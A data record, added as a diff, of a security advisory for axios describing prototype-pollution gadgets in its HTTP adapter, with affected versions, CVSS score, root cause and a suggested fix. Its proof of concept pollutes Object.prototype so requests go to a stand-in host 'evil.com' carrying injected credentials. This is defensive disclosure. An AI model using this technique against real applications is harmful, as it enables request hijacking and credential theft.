@@ -1,0 +1,180 @@
+advisory_id: GHSA-q8qp-cvcw-x6jj
+datasource_id: github_osv/GHSA-q8qp-cvcw-x6jj
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-q8qp-cvcw-x6jj/GHSA-q8qp-cvcw-x6jj.json
+aliases:
+  - CVE-2026-42264
+summary: |
+  Axios has prototype pollution read-side gadgets in HTTP adapter that allow credential injection and request hijacking
+  ## Summary
+
+  Five config properties in the HTTP adapter are read via direct property access without `hasOwnProperty` guards, making them exploitable as prototype pollution gadgets. When `Object.prototype` is polluted by another dependency in the same process, axios silently picks up these polluted values on every outbound HTTP request.
+
+  ## Affected Properties
+
+  1. **`config.auth`** (`lib/adapters/http.js` line 617)  Injects attacker-controlled `Authorization` header on all requests.
+  2. **`config.baseURL`** (`lib/helpers/resolveConfig.js` line 18) Redirects all requests using relative URLs to an attacker-controlled server.
+  3. **`config.socketPath`** (`lib/adapters/http.js` line 669) Redirects requests to internal Unix sockets (e.g. Docker daemon).
+  4. **`config.beforeRedirect`** (`lib/adapters/http.js` line 698) Executes attacker-supplied callback during HTTP redirects.
+  5. **`config.insecureHTTPParser`** (`lib/adapters/http.js` line 712) Enables Node.js insecure HTTP parser on all requests.
+
+  ## Proof of Concept
+
+  ```javascript
+  const axios = require('axios');
+
+  // Prototype pollution from a vulnerable dependency in the same process
+  Object.prototype.auth = { username: 'attacker', password: 'exfil' };
+  Object.prototype.baseURL = 'https://evil.com';
+
+  await axios.get('/api/users');
+  // Request is sent to: https://evil.com/api/users
+  // With header: Authorization: Basic YXR0YWNrZXI6ZXhmaWw=
+  // Attacker receives both the request and injected credentials
+  ```
+
+  ## Impact
+
+  - **Credential injection:** Every axios request includes an attacker-controlled `Authorization` header, leaking request contents to any server that logs auth headers.
+  - **Request hijacking:** All requests using relative URLs are silently redirected to an attacker-controlled server.
+  - **SSRF:** Requests can be redirected to internal Unix sockets, enabling container escape in Docker environments.
+  - **Code execution:** Attacker-supplied functions execute during HTTP redirects.
+  - **Parser weakening:** Insecure HTTP parser enabled on all requests, enabling request smuggling.
+
+  ## Root Cause
+
+  `mergeConfig()` iterates `Object.keys({...config1, ...config2})`, which only returns own properties. When neither the defaults nor the user config sets these properties, they are absent from the merged config. The HTTP adapter then reads them via direct property access (`config.auth`, `config.socketPath`, etc.), which traverses the prototype chain and picks up polluted values.
+
+  The `own()` helper at `lib/adapters/http.js` line 336 exists and guards 8 other properties (`data`, `lookup`, `family`, `httpVersion`, `http2Options`, `responseType`, `responseEncoding`, `transport`) from this exact attack. The 5 properties listed above are not included in this protection.
+
+  ## Suggested Fix
+
+  Apply the existing `own()` helper to all affected properties:
+
+  ```javascript
+  const configAuth = own('auth');
+  if (configAuth) {
+    const username = configAuth.username || '';
+    const password = configAuth.password || '';
+    auth = username + ':' + password;
+  }
+  ```
+
+  Same pattern for `socketPath`, `beforeRedirect`, `insecureHTTPParser`, and a `hasOwnProperty` check for `baseURL` in `resolveConfig.js`.
+impacted_packages:
+  - purl: pkg:npm/axios
+    affected_versions: vers:npm/>=1.0.0|<1.15.2
+    fixed_versions: vers:npm/1.15.2
+    affected_packages:
+      - pkg:npm/axios@1.0.0
+      - pkg:npm/axios@1.1.0
+      - pkg:npm/axios@1.1.1
+      - pkg:npm/axios@1.1.2
+      - pkg:npm/axios@1.1.3
+      - pkg:npm/axios@1.2.0-alpha.1
+      - pkg:npm/axios@1.2.0
+      - pkg:npm/axios@1.2.1
+      - pkg:npm/axios@1.2.2
+      - pkg:npm/axios@1.2.3
+      - pkg:npm/axios@1.2.4
+      - pkg:npm/axios@1.2.5
+      - pkg:npm/axios@1.2.6
+      - pkg:npm/axios@1.3.0
+      - pkg:npm/axios@1.3.1
+      - pkg:npm/axios@1.3.2
+      - pkg:npm/axios@1.3.3
+      - pkg:npm/axios@1.3.4
+      - pkg:npm/axios@1.3.5
+      - pkg:npm/axios@1.3.6
+      - pkg:npm/axios@1.4.0
+      - pkg:npm/axios@1.5.0
+      - pkg:npm/axios@1.5.1
+      - pkg:npm/axios@1.6.0
+      - pkg:npm/axios@1.6.1
+      - pkg:npm/axios@1.6.2
+      - pkg:npm/axios@1.6.3
+      - pkg:npm/axios@1.6.4
+      - pkg:npm/axios@1.6.5
+      - pkg:npm/axios@1.6.6
+      - pkg:npm/axios@1.6.7
+      - pkg:npm/axios@1.6.8
+      - pkg:npm/axios@1.7.0-beta.0
+      - pkg:npm/axios@1.7.0-beta.1
+      - pkg:npm/axios@1.7.0-beta.2
+      - pkg:npm/axios@1.7.0
+      - pkg:npm/axios@1.7.1
+      - pkg:npm/axios@1.7.2
+      - pkg:npm/axios@1.7.3
+      - pkg:npm/axios@1.7.4
+      - pkg:npm/axios@1.7.5
+      - pkg:npm/axios@1.7.6
+      - pkg:npm/axios@1.7.7
+      - pkg:npm/axios@1.7.8
+      - pkg:npm/axios@1.7.9
+      - pkg:npm/axios@1.8.0
+      - pkg:npm/axios@1.8.1
+      - pkg:npm/axios@1.8.2
+      - pkg:npm/axios@1.8.3
+      - pkg:npm/axios@1.8.4
+      - pkg:npm/axios@1.9.0
+      - pkg:npm/axios@1.10.0
+      - pkg:npm/axios@1.11.0
+      - pkg:npm/axios@1.12.0
+      - pkg:npm/axios@1.12.1
+      - pkg:npm/axios@1.12.2
+      - pkg:npm/axios@1.13.0
+      - pkg:npm/axios@1.13.1
+      - pkg:npm/axios@1.13.2
+      - pkg:npm/axios@1.13.3
+      - pkg:npm/axios@1.13.4
+      - pkg:npm/axios@1.13.5
+      - pkg:npm/axios@1.13.6
+      - pkg:npm/axios@1.14.0
+      - pkg:npm/axios@1.15.0
+      - pkg:npm/axios@1.15.1
+    fixed_packages:
+      - pkg:npm/axios@1.15.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/axios/axios
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/axios/axios
+        commit: 47915144662f2733e6c051bdcb895a8c8f0586aa
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-q8qp-cvcw-x6jj/GHSA-q8qp-cvcw-x6jj.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-1321
+references:
+  - url: https://github.com/axios/axios
+    reference_type:
+    reference_id:
+  - url: https://github.com/axios/axios/commit/47915144662f2733e6c051bdcb895a8c8f0586aa
+    reference_type:
+    reference_id:
+  - url: https://github.com/axios/axios/pull/10779
+    reference_type:
+    reference_id:
+  - url: https://github.com/axios/axios/releases/tag/v1.15.2
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42264
+    reference_type:
+    reference_id: CVE-2026-42264
+  - url: https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj
+    reference_type:
+    reference_id: GHSA-q8qp-cvcw-x6jj
+exploits: []
